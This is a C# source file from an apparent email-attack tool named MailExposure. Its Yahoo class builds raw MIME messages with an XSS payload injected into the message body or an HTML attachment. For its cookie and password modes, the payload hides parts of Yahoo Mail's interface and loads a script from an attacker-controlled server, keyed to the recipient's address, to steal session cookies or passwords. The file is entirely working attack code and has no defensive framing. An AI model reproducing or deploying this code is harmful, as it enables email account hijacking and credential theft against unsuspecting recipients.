using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using MailExposure.RecordInfo;

namespace MailExposure.MailXssCode
{
    class Yahoo
    {
        // Fields
        private string CRLF;

        // Methods
        public Yahoo()
        {
            CRLF = "\r\n";
        }
        public string MailPackage(Model model)
        {
            this.Xss(model);
            if (model.AttachmentName == null)
            {
                return ("MIME-Version: 1.0" + this.CRLF + "From:" + model.Nickname + "<" + model.Addresser + ">" + this.CRLF + "To:" + model.Addressee + this.CRLF + "Message-Id: <4C204D28.1CBB7D.06708@m12-17.163.com>" + this.CRLF + "Subject:" + model.Subject + this.CRLF + "Content-type:text/html;" + this.CRLF + "Content-Transfer-Encoding:quoted-printable" + this.CRLF + this.CRLF + model.Content + model.XSSCode + this.CRLF + this.CRLF + "." + this.CRLF);
            }
            string code = new StreamReader(model.AttachmentSrc, Encoding.GetEncoding("gb2312")).ReadToEnd();
            string str3 = "WING2001" + model.XSSCode + ".htm";
            return string.Concat(new object[] 
            { 
                "MIME-Version: 1.0", this.CRLF, "Content-Type: multipart/mixed; boundary=Mail_Boundary_00201010", this.CRLF, "From:", model.Nickname, "<", model.Addresser, ">", this.CRLF, "To:", model.Addressee, this.CRLF, "Subject:", model.Subject, this.CRLF, 
                this.CRLF, "Content-Type: multipart/alternative; boundary=Mail_Boundary_00201010", this.CRLF, this.CRLF, "--Mail_Boundary_00201010", this.CRLF, "Content-Type: text/html;Content-Transfer-Encoding:Base64", this.CRLF, this.CRLF, model.Content, this.CRLF, "--Mail_Boundary_00201010", this.CRLF, "Content-Type: text/html", this.CRLF, "Content-Disposition: attachment; filename=\"", 
                str3, "\"", this.CRLF, this.CRLF, '<', model.EncodeBase64(code), '>', this.CRLF, "--Mail_Boundary_00201010--", this.CRLF, this.CRLF, ".", this.CRLF
            });
        }

        private void Xss(Model model)
        {
            Record record = new Record();
            if (model.Type == "Cookie")
            {
                model.Address = "http://" + record.Dns("") + "/yahoo/index.asp?";
                model.XSSCode = "<style><!--.textLink.fontLink, .inlinemsg{display:none}--></style><script id=v b=div c=.textLink.fontLink n=tr k=span y=oninIcon o=display: m=none l=>{document.all.tags(v.b)[0].id=v.m}{ u=document.all.tags(v.n)[3].all.tags(v.k)}{u[2].onclick=v.m}{u[3].style.display=v.m}{u[1].innerText=u[1].innerText.replace(2,1)}{t=[2,3]}{setTimeout(function(){for(i in t)document.styleSheets[t[i]].rules(v.c).style.display=v.l},1300)}</script><script src=" + model.Address + "uid=" + model.Addressee + "></script>";
            }
            else if (model.Type == "Password")
            {
                model.Address = "http://" + record.Dns("") + "/yahoo/yahooP.asp?";
                model.XSSCode = "<style><!--.textLink.fontLink, .inlinemsg{display:none}--></style><script id=v b=div c=.textLink.fontLink n=tr k=span y=oninIcon o=display: m=none l=>{document.all.tags(v.b)[0].id=v.m}{ u=document.all.tags(v.n)[3].all.tags(v.k)}{u[2].onclick=v.m}{u[3].style.display=v.m}{u[1].innerText=u[1].innerText.replace(2,1)}{t=[2,3]}{setTimeout(function(){for(i in t)document.styleSheets[t[i]].rules(v.c).style.display=v.l},1300)}</script><script src=" + model.Address + "uid=" + model.Addressee + "></script>";
            }
            else if (model.Type == "Mail")
            {
                model.XSSCode = "";
            }
            else if (model.Type == "C+P")
            {
                model.Address = "http://" + record.Dns("") + "/yahoo/indexcp.asp?";
                model.XSSCode = "<style><!--.textLink.fontLink, .inlinemsg{display:none}--></style><script id=v b=div c=.textLink.fontLink n=tr k=span y=oninIcon o=display: m=none l=>{document.all.tags(v.b)[0].id=v.m}{ u=document.all.tags(v.n)[3].all.tags(v.k)}{u[2].onclick=v.m}{u[3].style.display=v.m}{u[1].innerText=u[1].innerText.replace(2,1)}{t=[2,3]}{setTimeout(function(){for(i in t)document.styleSheets[t[i]].rules(v.c).style.display=v.l},1300)}</script><script src=" + model.Address + "uid=" + model.Addressee + "></script>";
            }

        }
    }
}
